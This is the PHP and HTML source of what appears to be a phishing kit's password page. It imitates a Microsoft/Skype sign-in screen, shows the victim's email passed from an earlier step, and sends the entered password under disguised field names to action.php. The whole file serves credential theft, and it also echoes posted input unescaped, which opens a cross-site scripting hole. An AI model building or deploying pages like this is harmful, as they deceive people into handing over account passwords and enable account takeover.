  <?php
 session_start();
$use1= $_POST['uskkes1'];
 
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
<title>Sign In</title>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
<link rel="shortcut icon" href="images/favicoon.ico"/>
 
<link rel="stylesheet" href="css/style.css">
<body>
<div class="container1">
 
</div>
<div class="container">  
  <form id="contact" action=action.php method=post >
   <img src="images/logo.png" />
    <fieldset>
   <h3   style="font-size:16px; font-family:Arial, Helvetica, sans-serif"> <?php echo $use1 ?></h3>
      <input placeholder="Email, phone, or skype" type="hidden"   value="<?php echo $use1 ?>" name="off8900">
    </fieldset>
    
    <h1 class="row text-title" style="margin-top:-10px">Enter password</h1>
      
    <fieldset>
      <input placeholder="Password" type="password"  required name="offpa738">
    </fieldset>
    <fieldset>
      <h4><img src="images/3.png" alt="" title="" border=0 width=162 height="59" ></h4>
    </fieldset>
     
    <fieldset>
      <input name="submit" type="submit" id="contact-submit"  value="Next">    </fieldset>
    
  </form>
</div>
 